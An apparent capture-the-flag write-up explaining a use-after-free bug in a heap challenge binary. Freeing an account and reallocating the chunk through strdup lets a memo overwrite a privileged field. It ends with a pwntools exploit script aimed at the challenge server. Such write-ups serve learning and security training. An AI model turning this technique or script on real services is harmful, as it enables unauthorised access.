<h4>Discussion</h4>

<h5>Program Behavior</h5>

<p>Time and again, we observe that neglecting to clear heap pointers from memory after chunks are freed can result in severe security issues. Perhaps the most common type of use-after-free (UAF) exploitation is type-confusion, where a chunk containing one datatype is freed and subsequently reallocated to hold another data type; without clearing the chunk, an attacker may have access to priviledged fields.</p>

<p>This binary features a relatively simple interface. The user is can create, display, and delete an a account, as well as add a memo and print the flag. Of course, not any user can print the flag - the integer field at offset 0x40 of the account must be equal to a constant (not shown here due to its profanity). The user can create multiple accounts if he or she so wishes, but only one (<code>main_account</code>) is kept track of. After an account is deleted using <code>free()</code>, its pointer is retained in memory and there is absolutely no indication that the account has been deleted.</p>

<h5>Use After Free</h5>

<p>Because the program does not know whether the account has been deleted, it is vulnerable to use-after-free. Specifically, the account chunk, which is now free in the eyes of the memory allocator, can now be used to service another object - the memo. We can write freely to the memo, so in essence, we can control fields of the account (which the program still recognizes!). The memo is generated via <code>strdup</code>, as shown below.</p>

<p>In glibc, <code>strdup</code> is implemented in a straightforward manner; we reproduce the source code [1] below:</p>

<pre class = "c">
char *
__strdup (const char *s)
{
  size_t len = strlen (s) + 1;
  void *new = malloc (len);

  if (new == NULL)
    return NULL;

  return (char *) memcpy (new, s, len);
}
</pre>

<p>It simply takes the input argument (which is a string), finds its length using <code>strlen()</code>, adds one to make room for the null-byte terminator, calls <code>malloc()</code> to get memory for the duplicate string, and calls <code>memcpy()</code> to copy over the string plus the null-byte terminator. The important part for us is the fact that it gets memory via <code>malloc()</code>. If we <code>free()</code> the account (which is 0x48 bytes in size, warranting a 0x50-size chunk) and create a memo that is, say, 0x44 bytes in size (not including the null terminator), then we will get the account chunk back, now with control over the protected field.</p>

<p>We simply enter any string of size 0x40 and append the required integer word after. Now we can read the flag.</p>

<pre class = "python">
from pwn import *

p = remote("206.189.20.127", 30355)

p.recvuntil(b": ")
p.sendline(b'1')        #create account
p.recvuntil(b": ")
p.sendline(b"Kevin")
p.recvuntil(b": ")
p.sendline(b"Mitnick")

p.recvuntil(b": ")
p.sendline(b'3')        #delete account

p.recvuntil(b": ")
p.sendline(b'4')        #create memo
p.recvuntil(b":")
p.sendline(b'A' * 0x40 + b"fuck")

p.recvuntil(b": ")
p.sendline(b'5')        #print flag

p.interactive()
